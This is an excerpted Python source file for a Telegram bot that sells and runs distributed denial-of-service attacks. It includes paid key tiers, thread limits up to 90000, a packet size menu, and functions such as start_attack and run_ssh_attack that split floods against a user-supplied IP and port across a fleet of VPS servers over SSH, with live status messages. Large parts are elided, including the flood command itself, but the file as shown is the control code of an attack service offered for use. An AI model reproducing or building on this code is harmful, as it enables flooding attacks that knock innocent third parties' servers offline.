...
ALLOWED_GROUP_IDS = []
MAX_THREADS = 90000
SPECIAL_MAX_THREADS = 90000
VIP_MAX_THREADS = 90000
MAX_DURATION = 240
...
# 🛠️ BOT CONFIGURATION
# ======================
DEFAULT_PACKET_SIZE = 512  # Default packet size in bytes
...
bot_open = False
last_message_time = {}
MESSAGE_INTERVAL = 1  # Minimum 1 second between messages per user
...
def get_vps_status():
    ...
    for vps in VPS_LIST:
        ...
        if ip in vps_status:
            vps_info['status'] = vps_status[ip].get('status', 'available')
            if vps_info['status'] == 'busy':
                attack_id = vps_status[ip].get('attack_id')
                if attack_id in running_attacks:
                    vps_info['attack'] = running_attacks[attack_id]['target']
                    vps_info['since'] = time.time() - running_attacks[attack_id]['start_time']
        
        status_report.append(vps_info)
...
def load_data():
    ...
    if os.path.exists('keys.json'):
        with open('keys.json', 'r') as f:
            ...
            MAX_THREADS = thread_settings.get('MAX_THREADS', 90000)
            SPECIAL_MAX_THREADS = thread_settings.get('SPECIAL_MAX_THREADS', 90000)
            VIP_MAX_THREADS = thread_settings.get('VIP_MAX_THREADS', 90000)
...
def create_main_keyboard(message=None):
    ...
    buttons = [
        ...
        telebot.types.KeyboardButton("📦 PACKET SIZE")  # New button
    ]
...
def rate_limited_handler(message):
    user_id = message.from_user.id
    current_time = time.time()
    
    if user_id in last_message_time:
        elapsed = current_time - last_message_time[user_id]
...
# Add this before starting the bot
bot.add_custom_filter(telebot.custom_filters.TextMatchFilter())
...
def start_attack(message, ip, port, duration, threads, is_public=False):
    ...
    # Get current packet size from user data or use default
    packet_size = redeemed_users[user_id].get('packet_size', DEFAULT_PACKET_SIZE) if user_id in redeemed_users else DEFAULT_PACKET_SIZE
    
    # Distribute attack across all available VPS
    vps_distribution = []
    total_threads = threads
    threads_per_vps = max(1, threads // len(VPS_LIST[:ACTIVE_VPS_COUNT]))
    
    for vps in VPS_LIST[:ACTIVE_VPS_COUNT]:
        if len(vps) >= 3:  # Ensure valid VPS config
            # Assign threads to this VPS
            assign_threads = min(threads_per_vps, total_threads)
            if assign_threads > 0:
                vps_distribution.append((vps, assign_threads))
                total_threads -= assign_threads
...
"""
    ...
    # Start attack on all VPS simultaneously
...
def run_ssh_attack(vps, ip, port, duration, threads, packet_size, attack_id, attack_num, chat_id, user_id, is_vip, msg_id, country, flag, protection, is_public=False):
    ...
    try:
        ...
        # Include packet size in attack command
        ...
        while True:
            ...
            if current_time - last_update >= 1:
                update_attack_status(chat_id, msg_id, ip, port, duration, threads, packet_size, progress, country, flag, protection, is_vip, is_public)
        ...
        update_attack_status(chat_id, msg_id, ip, port, duration, threads, packet_size, 100, country, flag, protection, is_vip, is_public)
        
        running_attacks[attack_id_vps]['completed'] = True
        
        # Check if all attacks for this target are complete
...
def update_attack_status(chat_id, msg_id, ip, port, duration, threads, packet_size, progress, country, flag, protection, is_vip, is_public):
    attack_type = "🌐 PUBLIC" if is_public else "🔥 VIP" if is_vip else "⚡ SPECIAL"
...
@bot.message_handler(func=lambda msg: msg.text == "📦 PACKET SIZE")
def set_packet_size(message):
    """Set packet size for attacks"""
    user_id = str(message.from_user.id)
    ...
    current_size = redeemed_users.get(user_id, {}).get('packet_size', DEFAULT_PACKET_SIZE)
    
    markup = telebot.types.ReplyKeyboardMarkup(row_width=3, resize_keyboard=True)
    sizes = [512, 1024, 2048, 4096, 8192, 16384]
    buttons = [telebot.types.KeyboardButton(str(size)) for size in sizes]
    markup.add(*buttons)
    markup.add(telebot.types.KeyboardButton("🔙 Back"))
    
    bot.reply_to(message, 
        f"📦 Current Packet Size: {current_size} bytes\n"
        f"Select new size (MIN: {MIN_PACKET_SIZE}, MAX: {MAX_PACKET_SIZE}):",
        reply_markup=markup)
    
    bot.register_next_step_handler(message, process_packet_size_selection)

def process_packet_size_selection(message):
    if message.text == "🔙 Back":
        bot.reply_to(message, "Returning to main menu...", reply_markup=create_main_keyboard(message))
        return
    ...
    try:
        ...
        bot.reply_to(message, 
            f"✅ Packet size set to {new_size} bytes\n"
            f"This will be used for all your future attacks.",
            reply_markup=create_main_keyboard(message))
            
    except:
        bot.reply_to(message, 
            f"❌ Invalid size! Must be between {MIN_PACKET_SIZE} and {MAX_PACKET_SIZE} bytes",
            reply_markup=create_main_keyboard(message))
...
def process_normal_threads(message):
    try:
        ...
        if new_value < 1 or new_value > 99000:
